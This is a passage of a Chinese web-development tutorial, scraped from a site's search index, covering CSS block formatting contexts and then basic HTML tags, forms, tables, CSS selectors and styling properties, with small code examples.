可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性，例如可以包含浮动元素，使到它可以包含浮动元素，从而防止出现高度塌陷的问题 \u0026mdash;  如何触发 BFC  触发 BFC 的条件\n 浮动元素，float 除 none 以外的值 绝对定位元素，position（absolute，fixed） display 为以下其中之一的值 inline-blocks，table-cells，table-captions overflow 除了 visible 以外的值（hidden，auto，scroll）\n 在 CSS3 中，BFC 叫做 Flow Root，并增加了一些触发条件：\n display 的 table-caption 值\n position 的 fixed 值，其实 fixed 是 absolute 的一个子类，因此在 CSS2.1 中使用这个值也会触发 BFC ，只是在 CSS3 中更加明确了这一点\n   BFC布局规则  内部的Box会在垂直方向，一个接一个地放置。 Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠 每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如 此。 BFC的区域不会与float box重叠。 BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。 计算BFC的高度时，浮动元素也参与计算  BFC的作用及原理  自适应两栏布局  body { width: 300px; position: relative; } .aside { width: 100px; height: 150px; float: left; background: #f66; } .main { height: 200px; background: #fcc; }  \u0026lt;body\u0026gt; \u0026lt;div class=\u0026quot;aside\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;main\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt;   根据BFC布局规则第3条：  每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。  因此，虽然存在浮动的元素aslide，但main的左边依然会与包含块的左边相接触 根据BFC布局规则第四条：\n BFC的区域不会与float box重叠  我们可以通过通过触发main生成BFC， 来实现自适应两栏布局\n  .main { overflow: hidden; }   当触发main生成BFC后，这个新的BFC不会与浮动的aside重叠。因此会根据包含块的宽度，和aside的宽度，自动变窄。效果如下：   清除内部浮动  .par { border: 5px solid #fcc; width: 300px; } .child { border: 5px solid #f66; width: 100px; height: 100px; float: left; }  \u0026lt;body\u0026gt; \u0026lt;div class=\u0026quot;par\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;child\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;child\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt;   根据BFC布局规则第六条：  计算BFC的高度时，浮动元素也参与计算  为达到清除内部浮动，我们可以触发par生成BFC，那么par在计算高度时，par内部的浮动元素child也会参与计算  .par { overflow: hidden; }   防止垂直 margin 重叠  p { color: #f55; background: #fcc; width: 200px; line-height: 100px; text-align: center; margin: 100px; }  \u0026lt;p\u0026gt;Haha\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Hehe\u0026lt;/p\u0026gt;   两个p之间的距离为100px，发送了margin重叠 根据BFC布局规则第二条：  Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠  我们可以在p外面包裹一层容器，并触发该容器生成一个BFC。那么两个P便不属于同一个BFC，就不会发生margin重叠了  .wrap { overflow: hidden; } p { color: #f55; background: #fcc; width: 200px; line-height: 100px; text-align: center; margin: 100px; }  \u0026lt;p\u0026gt;Haha\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026quot;wrap\u0026quot;\u0026gt; \u0026lt;p\u0026gt;Hehe\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt;  总结  其实以上的几个例子都体现了BFC布局规则第五条  BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此  因为BFC内部的元素和外部的元素绝对不会互相影响，因此， 当BFC外部存在浮动时，它不应该影响BFC内部Box的布局，BFC会通过变窄，而不与浮动有重叠。同样的，当BFC内部有浮动时，为了不影响外部元素的布局，BFC计算高度时会包括浮动的高度。避免margin重叠也是这样的一个道理  相关阅读  那些年我们一起清除过的浮动 BFC 深入理解 Thierry Koblentz 的-Everything you Know about Clearfix is Wrong ","permalink":"http://localhost:8000/public/post/css%E4%B8%AD%E7%9A%84bfc/","tags":["CSS"],"title":"CSS中的BFC"},{"categories":["Front-End","搬运整理"],"contents":"第一部分 HTML 第一章 职业规划和前景  职业方向规划定位：\n web前端开发工程师 web网站架构师 自己创业 转岗管理或其他   web前端开发的前景展望：\n 未来IT行业企业需求最多的人才 结合最新的html5抢占移动端的市场 自己创业做老板 随着互联网的普及web开发成为企业的宠儿和核心  web职业发展目标：\n 第一、梳理知识架构 负责内容的HTML 负责外观的css（层叠样式表） 负责行为的js ps切图\n 第二、分解目标（起步阶段、提升阶段、成型阶段）\n 起步阶段：\n 基本知识的掌握 常用工具的掌握 沟通技巧的掌握（围绕客户的需求） 良好的开发习惯（加注释、对齐方式）  提升阶段：\n 熟悉掌握HTML基本标签和属性 熟练掌握css的基本语法和使用 浏览器兼容和w3c标准的掌握 结合html+css+js开始系统项目的开发  成型阶段：\n 精通DIV+CCS布局 精通css样式表控制html标签 熟悉运用js制作动态网站的效果 能独立开发完成网站    第二章 html基本结构  认识HTML：\n html不是一种编程语言，是一种标志语言 标记语言是由一套标识标签组成的 html使用标签来描述网页  html结构：\n  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   不成对出现的标签 \u0026lt;br\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;meta\u0026gt; \u0026lt;img\u0026gt; \u0026lt;input..\u0026gt; \u0026lt;option..\u0026gt; \u0026lt;link\u0026gt;\n HTML 基本标签的讲解：\n \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;body\u0026gt;标签 \u0026lt;h1\u0026gt;\u0026mdash;-\u0026lt;h6\u0026gt;仅仅用于标题文本，不要为了产生粗体文本使用它们 \u0026lt;p\u0026gt;标签 段落标签 \u0026lt;strong\u0026gt;\u0026lt;b\u0026gt;标签\n 都会让文字产生加粗效果\n \u0026lt;strong\u0026gt;用于强调文本，强度更深，表示重要文本\u0026mdash;\u0026gt;用于SEO优化 \u0026lt;b\u0026gt;只是视觉加粗效果\u0026mdash;\u0026gt;单纯为了产生加粗  \u0026lt;em\u0026gt; \u0026lt;i\u0026gt;标签\n em用于强调文本\n i只是视觉斜体效果\n \u0026lt;strong\u0026gt;比\u0026lt;em\u0026gt;强调更强\n 特殊符号：\n \u0026amp;nbsp;\u0026mdash;\u0026gt;空格\n \u0026amp;gt;\u0026mdash;\u0026gt;大于号\n \u0026amp;lt;\u0026mdash;\u0026gt;小于号\n \u0026amp;quot;\u0026mdash;\u0026gt;引号\n \u0026amp;copy;\u0026mdash;\u0026gt;版权号\n   第三章 html基本标签  HTMl基本标签：\n span标签  对被用来组合文档中的行内元素 注意：span没有固定的格式表现，当对它应用样式时，才会产生视觉上的变化  \u0026lt;pre\u0026gt;标签  文字的格式按源码的排版来显示，我们称之为预处理格式  \u0026lt;a\u0026gt;标签\u0026mdash;\u0026gt;他有一个必不可少的属性 href\n target属性： _self(在原来页面打开) _blank（新窗口打开） _top（打开时忽略所有的框架） _parent（在父窗口中打开）  创建锚点和锚链接\n 锚点也是一种超链接，是页面内进行跳转的超链接  第一步：创建锚点 \u0026lt;a name=\u0026quot;锚点名称\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; 第二步：使用创建好的锚点名称 \u0026lt;a href=\u0026quot;#锚点名称\u0026quot;\u0026gt;内容\u0026lt;/a\u0026gt;   marquee标签\n 可以创建一个内容滚动效果    \u0026lt;marquee direction=\u0026quot;down\u0026quot; loop=\u0026quot;4\u0026quot; onmouseover=this.stop() onmouseout=this.start()\u0026gt;\u0026lt;/marquee\u0026gt;   direction 表示滚动方向，取值有（left,right,up,down,默认left） loop表示滚动循环的次数，默认为无限循环  onmouseover=this.stop() onmouseover=this.start() scrollamout=\u0026quot;1\u0026quot;(滚动速度)   表示当鼠标移上区域的时候停止滚动，鼠标移开继续滚动  第四章 img图片标签与路径  图片标签与路径：\n 常见图片格式 jpg png gif Gif （只支持全透明） Jpeg /jpg\n Png 半/全透明都支持  图片标签写法 ：\n \u0026lt;img src=\u0026quot;\u0026quot; alt=\u0026quot;\u0026quot; width=\u0026quot;\u0026quot; height=\u0026quot;\u0026quot; /\u0026gt;  图片四要素：\n src=\u0026quot;\u0026quot; 图片路径 alt=\u0026quot;\u0026quot; 图片含义 width=\u0026quot;\u0026quot; 图片宽度 和图片大小保持一致 height=\u0026quot;\u0026quot; 图片高度 和图片大小保持一致 title=\u0026quot;\u0026quot;  路径知识：\n 相对路径、绝对路径：\n 相对路径：(Relative Path) 相对于该文件的路径； 绝对路径：(Absolute Path) 从磁盘出发的路径；  \u0026lt;img src=\u0026quot;\u0026quot; …… align=\u0026quot;\u0026quot; /\u0026gt; align属性\u0026ndash;设置图片与后面文字的位置关系 值\u0026ndash;top、bottom、middle、absmiddle、left、right\n  在静态页面中：\n /开头表示根目录；\n ./表示当前目录；（斜画线前面一个点）\n ../上级目录；（斜画线前面两个点）\n 直接用文件名不带/也表示同一目录\n 这些都是相对于当前文件的位置来说的，如果用绝对路径的话就是写全了。\n   第五章 三种列表的讲解  三种列表的知识讲解：  \u0026lt;ul\u0026gt;无序列表  无序列表是一个没有顺序项目的列表，此列表项默认粗体圆点进行标识    \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;   有序列表  有序列表也是一列项目，只是列表项目使用的是数字进行标记。 有序列表始于 \u0026lt;ol\u0026gt; 标签。每个列表项始于 \u0026lt;li\u0026gt;标签。    \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;内容一\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;内容二\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;内容三\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt;   列表符号\n 无序列表-列表符号:\n type=\u0026quot;circle\u0026quot; 空心圆 type=“disc” 实心圆 默认值 type=\u0026quot;square\u0026quot; 方块符\n 有序列表-列表符号\n type=\u0026quot;A\u0026quot; A B C D\n type=\u0026quot;a\u0026quot; a b c d\n type=\u0026quot;1\u0026quot; 1 2 3 4 默认值type=\u0026ldquo;I\u0026rdquo; I II III type=\u0026ldquo;i\u0026rdquo; i ii iii\n 列表嵌套\n 无序列表-嵌套\n   \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;柚子 \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;沙田柚\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;蜜柚\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;荔枝\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;苹果\u0026lt;/li\u0026gt;\u0026lt;/ul\u0026gt;   有序列表-嵌套  \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;茶 \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;红茶\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;绿茶\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;果汁\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;牛奶\u0026lt;/li\u0026gt;\u0026lt;/ol\u0026gt;   定义列表  定义列表不仅仅是一列项目，而是项目及其注释的组合。定义列表以 \u0026lt;dl\u0026gt; 标签开始。每个定义列表项以 \u0026lt;dt\u0026gt;开始。每个自定义列表项的定义以 \u0026lt;dd\u0026gt; 开始。   \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;pc网页制作\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;学习DIV+CSS JS JQ 项目实战\u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt;手机网页制作\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;手机网页制作实战\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt;   dd是对dt的解释\n \u0026lt; dl\u0026gt;\u0026lt; /dl\u0026gt;用来创建一个普通的列表, \u0026lt; dt\u0026gt;\u0026lt; /dt\u0026gt;用来创建列表中的上层项目， \u0026lt; dd\u0026gt;\u0026lt; /dd\u0026gt;用来创建列表中最下层项目， \u0026lt; dt\u0026gt;\u0026lt; /dt\u0026gt;和\u0026lt; dd\u0026gt;\u0026lt; /dd\u0026gt;都必须放在\u0026lt; dl\u0026gt;\u0026lt; /dl\u0026gt;标志对之间。   \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;中国城市\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;北京 \u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;上海 \u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;广州 \u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt;美国城市\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;华盛顿 \u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;芝加哥 \u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;纽约 \u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt;   dl是definition list的缩写 dt是definition title的缩写 dd是definition description的缩写\n list-style属性具有三个属性分量：\n list-style-position ：设置列表项图标的位置，位于文本内或者文本外\n list-style-type： 设置列表项图标的类型\n list-style-image：使用图像设置列表项图标\n  第六章 表单元素(上)  表单标签:\n \u0026lt;form\u0026gt;表单标签\n \u0026lt;form\u0026gt;表单是一个包含表单元素的区域，包括起来的都是表单的内容\n\u0026lt;form\u0026gt; \u0026lt;input type=\u0026quot;text\u0026quot;/\u0026gt; \u0026lt;/form\u0026gt;   HTML标签 - Action和确认按钮：\n 当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。    \u0026lt;form action=\u0026quot;html.do\u0026quot; method=\u0026quot;get\u0026quot;\u0026gt; username: \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;user\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;提 交\u0026quot; /\u0026gt; \u0026lt;/form\u0026gt;   HTML标签 - 隐藏域隐藏标签：\n 隐藏域在页面中对于用户是不可见的，在表单中插入隐藏域的目的在于收集或发送信息，以利于被处理表单的程序所使用。浏览者单击发送按钮发送表单的时候，隐藏域的信息也被一起发送到服务器\n  \u0026lt;form\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;hid\u0026quot; value=\u0026quot;value\u0026quot;\u0026gt; \u0026lt;/form\u0026gt;   \u0026lt;input\u0026gt;标签的掌握\n 常用type类型：\n \u0026lt;input type=\u0026quot;\u0026quot; name=\u0026quot;\u0026quot; value=\u0026quot;\u0026quot; /\u0026gt; type=\u0026quot;text\u0026quot; 单行文本输入框 type=\u0026quot;password\u0026quot; 密码（maxlength=\u0026quot;\u0026quot;） type=\u0026quot;radio\u0026quot; 单项选择（checked=\u0026quot;checked\u0026quot;） type=\u0026quot;checkbox\u0026quot; 多项选择\n type=\u0026quot;button\u0026quot; 按钮 type=\u0026quot;submit\u0026quot; 提交 type=\u0026quot;image\u0026quot;图片提交 type=\u0026quot;file\u0026quot; 上传文件 type=\u0026quot;reset\u0026quot;重置 type=\u0026quot;hidden\u0026quot; 隐藏   关于表单中的设置默认值：\n\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;\u0026quot; value=\u0026quot;今天心情不错\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;radio\u0026quot; name=\u0026quot;\u0026quot; value=\u0026quot;\u0026quot; checked=\u0026quot;checked\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;checkbox\u0026quot; name=\u0026quot;\u0026quot; value=\u0026quot;\u0026quot; checked=\u0026quot;checked\u0026quot;\u0026gt;  \u0026lt;select name=\u0026quot;\u0026quot; \u0026gt; \u0026lt;option value=\u0026quot;\u0026quot;\u0026gt;\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026quot;\u0026quot; selected=\u0026quot;selected\u0026quot;\u0026gt;\u0026lt;/option\u0026gt; \u0026lt;select\u0026gt;  textarea没有默认值\n \u0026lt;label\u0026gt;标签的使用\n \u0026lt;label\u0026gt;\u0026lt;/label\u0026gt; label 元素不会向用户呈现任何特殊效果。 不过，它为鼠标用户改进了可用性。 如果您在 label 元素内点击文本，就会触发此控件。 就是说，当用户选择该标签时，浏览器就会自动将焦点转到和标签相关的表单控件上。\n \u0026lt;label\u0026gt; 标签的for 属性应当与相关元素的 id属性相同。\n 例子：（重要\u0026mdash;注册表单\u0026ndash;用户体验\u0026ndash;必做）\n\u0026lt;p\u0026gt;单向选择\u0026lt;/p\u0026gt; \u0026lt;label for=\u0026quot;male\u0026quot;\u0026gt;男：\u0026lt;/label\u0026gt;\u0026lt;input type=\u0026quot;radio\u0026quot; name=\u0026quot;sex\u0026quot; id=\u0026quot;male\u0026quot;/\u0026gt; \u0026lt;label for=\u0026quot;nv\u0026quot;\u0026gt;女：\u0026lt;/label\u0026gt;\u0026lt;input type=\u0026quot;radio\u0026quot; name=\u0026quot;sex\u0026quot;checked=\u0026quot;check\u0026quot;/\u0026gt;    第七章 表单和表格(下)  表单和表格标签：  \u0026lt;textarea\u0026gt;文本域标签 \u0026lt;textarea\u0026gt;标签： \u0026lt;textarea\u0026gt;\u0026lt;/textarea\u0026gt;是文本域标签，可以在其中插入一段文字内容，它有两个常用属性rows和cols  注意：\n rows表示这个文本域有多少行 cols表示这个文本域有多少列  除了这两个属性它还有readonly（只读，文本域的内容无法改变，相当于协议）和title（鼠标放上提示）\n \u0026lt;select\u0026gt;标签的掌握\n 注：当提交表单时，浏览器会提交选定的项目，或者收集用逗号分隔的多个选项，将其合成一个单独的参数列表，并且在将 \u0026lt;select\u0026gt; 表单数据提交给服务器时包括 name属性  \u0026lt;form\u0026gt; \u0026lt;select name=\u0026quot;\u0026quot; id=\u0026quot;\u0026quot;\u0026gt; \u0026lt;option value=\u0026quot;1\u0026quot;\u0026gt;1月\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026quot;2\u0026quot;\u0026gt;2月\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/form\u0026gt;   常用到的属性：disabled=“disabled” name=\u0026quot;sel\u0026quot; size=\u0026quot;2\u0026quot;\n \u0026lt;table\u0026gt;表格标签\n \u0026lt;table\u0026gt;表格标签：\u0026lt;table\u0026gt;是表格标签，可以用它定义一个表格。\n\u0026lt;table border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;姓名\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;性别\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt;  注意：\u0026lt;table\u0026gt;的border属性不能少\n \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;标签的使用\n \u0026lt;tr\u0026gt;行标签：\n \u0026lt;tr\u0026gt;可以定义表格中的一行，一个\u0026lt;tr\u0026gt;\u0026lt;/tr\u0026gt;表示一行。     \u0026lt;table border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;姓名\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;性别\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;姓名\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;性别\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt;   \u0026lt;td\u0026gt;单元格标签:\n \u0026lt;td\u0026gt;可以定义表格中的一个单元格，\u0026lt;td\u0026gt;\u0026lt;/td\u0026gt;表示一个单元格。  \u0026lt;table border=\u0026quot;1\u0026quot;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td \u0026gt;姓名\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;性别\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;爱好\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt;  border-collapse 属性设置是否将表格边框折叠为单一边框： border-collapse:collapse; colspan左右合并 rowspan上下合并   第一部分总结：\n 非可视化标签：head meta style scrpit... 可视化标签：img div span a ul li\u0026hellip; 只有可视化标签，才能用css改变它 单标签：meta link base img input br hr 双标签：html head body div a p span ..ul li ol dl \u0026hellip;.\n 常用可视化标签\n ** div**  一般用它来布局  a 超链接标签  href*属性：设置跳转的网页地址 target属性：设置跳转的目标 结论：凡事页面可以点击跳转或者表单提交的文字，都用a标签  img  src*属性用来设置图片的url数据 alt提供给搜索引擎搜索的 width height 结论 ：显示图片  ul li  列表 结论：只要将来设计页面中有固定样式的列表，就用ul和li  table caption tr td (th)  慢慢已经被淘汰了 被ul li代替 如果是合并竖排的就是合并行（rowspan） 如果是合并横排的就是合并列（colspan）    HTML部分导图总结\n HTML5标签集合  第二部分 CSS 第八章 css基础知识  css基础知识：  css样式表的定义 css：（Cascading Style Sheets）层叠样式表；  分类及位置：内部样式-head区域style标签里面  外部样式-link调用 内联样式-标签元素里面  css内的注释：/*注释内容*/ css样式表的语法\n CSS规则由两个主要的部分构成：要添加样式的盒子名或者标签名、和要添加的样式。\n 盒子名或者标签名{属性:值;}\n CSS中几种颜色的表示方法\n 用颜色名表示 有17个预先确定的颜色，它们是  aqua, black, blue, fuchsia, gray, green, lime, maroon, navy, olive, orange, purple, red, silver, teal, white, and yellow   用十六进制的颜色值表示(红、绿、蓝)\n #FF0000或者#F00  用rgb(r,g,b)函数表示\n 如：rgb(255,255,0)  用hsl(Hue,Saturation,Lightness)函数表示（色调、饱和度、亮度)\n 如：hsl(120,100%,100%),色调0代表红色，120代表绿色，240代表 蓝色\n 用rgba(r,g,b,a)函数表示\n 其中a表示的是改颜色的透明度，取值范围是0~1，其中0代表完全透明\n  用hsla(Hue,Saturation,Lightness,alpha)函数表示\n 色调、饱和度、亮度、透明度  例子\n   \u0026lt;div style=\u0026quot;position:absolute;top:0px\u0026quot;\u0026gt; \u0026lt;div style=\u0026quot;background-color:gray;\u0026quot;\u0026gt;background-color:gray\u0026lt;/div\u0026gt; \u0026lt;div style=\u0026quot;background-color:#F00;\u0026quot;\u0026gt;background-color:#F00\u0026lt;/div\u0026gt; \u0026lt;div style=\u0026quot;background-color:#ffff00;\u0026quot;\u0026gt;background-color:#ffff00\u0026lt;/div\u0026gt; \u0026lt;div style=\u0026quot;background-color:rgb(255,0,255);\u0026quot;\u0026gt;background-color:rgb(255,0,255)\u0026lt;/div\u0026gt; \u0026lt;div style=\u0026quot;background-color:hsl(120,80%,50%);\u0026quot;\u0026gt;background-color:hsl(120,80%,50%)\u0026lt;/div\u0026gt; \u0026lt;div style=\u0026quot;background-color:rgba(255,0,255,0.5);\u0026quot;\u0026gt;background-color:rgba(255,0,255,0.5)\u0026lt;/div\u0026gt; \u0026lt;div style=\u0026quot;background-color:hsla(120,80%,50%,0.5);\u0026quot;\u0026gt;background-color:hsla(120,80%,50%,0.5)\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   内部样式表  当单个页面需要设置样式时，就应该使用内部样式表。 使用 \u0026lt;style\u0026gt;\u0026lt;/style\u0026gt;标签在文档\u0026lt;head\u0026gt;\u0026lt;/head\u0026gt;里面定义内部样式表   \u0026lt;head\u0026gt; \u0026lt;style type=\u0026quot;text/css\u0026quot; \u0026gt; p{color:red;} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt;   从外部引入到样式分为两种：（注意写在head标签里面）\n 当样式需要应用于很多页面时，就需要用到外部样式表，首先需要创建一个css文件，然后引用到我们的页面中。\n Link样式表式： \u0026lt;link rel=”stylesheet” type=”text/css” href=”my.css”(href表示路径)\u0026gt;\n Html式： \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt;@import url(\u0026quot;css.css\u0026quot;);\u0026gt;\u0026lt;/style\u0026gt;\n 内联样式表（优先级高）\n 写在标签里面的样式\n 如：\u0026lt;p style=\u0026quot;color:red;\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\n  表示给p标签里面的文字颜色设置为红色\n 区别：外链样式与导入样式\n link标签是属于xhtml范畴，而@import则是css2.1中特有的。link标签除了可以加载CSS外，还可以做很多其它的事情，比如定义RSS，定义rel连接属性等，@import就只能加载CSS了。\n 加载的顺序的区别，link加载的css时，是一种并行(没有尝试是否是这样)加载CSS方式，而@impor则在整个页面加载完成后才加载。\n 兼容性的区别，因@importCSS2.1才特有的，所以对于不兼容CSS2.1的浏览器来说，无效。\n 在样式控制上(比如动态改变网页的布局时,使用javascript操作DOM)的区别，此时@import就无能为力了。\n    样式的优先级补充  相同权值情况下，CSS样式的优先级总结来说，就是——就近原则（离被设置元素越近优先级别越高）： 内联样式表（标签内部） \u0026gt; 嵌入样式表（当前文件中）\u0026gt; 外部样式表（外部文件中）  权值不同时，浏览器是根据权值来判断使用哪种css样式的，哪种样式权值高就使用哪种样式\n 层叠优先级是:\n 浏览器缺省\u0026lt; 外部样式表 \u0026lt; 内部样式表 \u0026lt; 内联样式  其中样式表又有:类选择器 \u0026lt; 类派生选择器\u0026lt;ID选择器 \u0026lt; ID派生选择器\n 派生选择器以前叫上下文选择器，所以完整的层叠优先级是:\n 浏览器缺省 \u0026lt;外部样式表 \u0026lt; 外部样式表类选择器 \u0026lt; 外部样式表类派生选择器\u0026lt; 外部样式表ID选择器 \u0026lt; 外部样式表ID派生选择器\u0026lt; 内部样式表 \u0026lt; 内部样式表类选择器 \u0026lt; 内部样式表类派生选择器 \u0026lt; 内部样式表ID选择器 \u0026lt; 内部样式表ID派生选择器 \u0026lt; 内联样式\u0026hellip;共12个优先级  另外，如果同一个元素在没有其他样式的作用影响下，其Class定义了多个并以空格分开，其优先级顺序为：\n 一个元素同时应用多个class，后定义的优先（即近者优先），加上!important者最优先！   第九章 css选择器(上)  css选择器：  class类选择器可以重复利用\n id选择器唯一  标签选择器  什么是选择器：css选择器就是要改变样式的对象  选择器{属性:值;属性:值;}\n 标签选择器：页面中所有的标签都是一个选择器 p{color:red;}\n ID选择器\n 选择id命名的元素 以 # 开头 #p1{color:#0f0;}  类选择器\n class选择器，选择clas命名的元素 以.开头 .first{color:#00f;}  css代码写完后上线前要经过压缩处理\n 本地和服务器分两个css版本（备份）\n 压缩后注释都清除，空间体积减少\n 群组选择器\n 选择多个元素,以逗号隔开 #main,.first,span,a,h1{color:red;}  包含选择器\n 选择某元素的后代元素，也称后代选择器，父类与子类间以空格隔开p\n span{color:red;}   属性选择器\n 选择包含某一属性的元素 a[title]{color:red;} 选择包含title的a标签 a[title][href]{color:red;} 选择包含title和href的a标签  \u0026gt; + 选择器子类选择器：只选择子元素（只选择儿子）（相当于包含元素）\n p \u0026gt; span{color:red;}  相邻兄弟选择器：只选择后面的相邻兄弟元素\n p + span{color:red;}   第十章 css选择器(下)  \u0026lt;a\u0026gt;伪类选择器  a:link {color:#FF0000;} /* 未访问的链接 */ （只用于a标签） a:visited {color:#00FF00;} /* 已访问的链接 */ （只用于a标签） a:hover {color:#FF00FF;}/* 鼠标移动到链接上 */（可和其他标签结合一起用） a:active {color:#0000FF;} /* 选定的链接 */ 注意  伪类选择器的排序很重要，a:link a:visited a:hover a:active，记作lvha   输入伪类选择器（针对表单）\n input:focus{color:red;} /* 键盘输入焦点 */  其他伪类选择器\n p:first-child{color:red;} / * 第一个p */ :before 在元素之前添加内容。 :after 在元素之后添加内容。  css优先规则\n 内联样式表-\u0026gt; ID 选择器—\u0026gt; Class 类选择器-\u0026gt;标签选择器   第十一章 背景属性  背景属性：\n 背景的添加 ：\n 背景颜色的添加:\n background:red;\n backgronnd-color:red;\n 背景图片的添加：\n background:url(“images/1.jpg”);\n backgronnd-image:url(“images/1.jpg”);\n 背景的平铺\n 什么是平铺？平铺就是图片是否重复出现\n 不平铺：background-repeat:no-repeat;\n 水平方向平铺：background-repeat:repeat-x;\n 垂直方向平铺：background-repeat:repeat-y;\n 完全平铺：默认为完全平铺\n 背景图片的定位\n 背景图片的定位就是可以设置显示背景图片的位置，通过属性background-position来实现\n background-position的取值可为英文单词或者数值和百分值。\n background-positon的英文单词取值\n top left\n top center\n top right\n center left\n center center\n center right\n bottom left\n bottom center\n ottom right\n background-positon的数值取值\n background-position:x y;\n positon的百分值取值\n background-position:x% y%;\n 背景图片的大小\n 背景图片的大小可以通过属性background-size来设置background-size的取值可为数值和百分值。\n background-size的数值取值\n background-size:x y;\n background-size的数值取值\n background-size:x% y%;\n 背景图片的滚动\n 背景图片是否随着内容的滚动而滚动由background-attachment设置\n background-attachment:fixed; 固定，不随内容的滚动而滚动\n background-attachment:scroll; 滚动，随内容的滚动而滚动\n   第十二章 文字文本属性  css文字文本属性：\n 文字属性\n color:red; 文字颜色\n font-size:12px; 文字大小\n font-weight:“bold” 文字粗细(bold/normal)\n font-family:“宋体” 文字字体\n font-variant:small-caps小写字母以大写字母显示\n 文本属性\n text-align:center; 文本对齐(right/left/center)\n line-height:10px; 行间距(可通过它实现文本的垂直居中)\n text-indent:20px; 首行缩进\n text-decoration:none;\n 文本线(none/underline/overline/line-through)  letter-spacing: 字间距\n   第十三章 盒子模型  盒子模型  盒子模型就是一个有高度和宽度的矩形区域 所有html标签都是盒子模型 div标签自定义盒子模型  所有的标签都是盒子模型\n 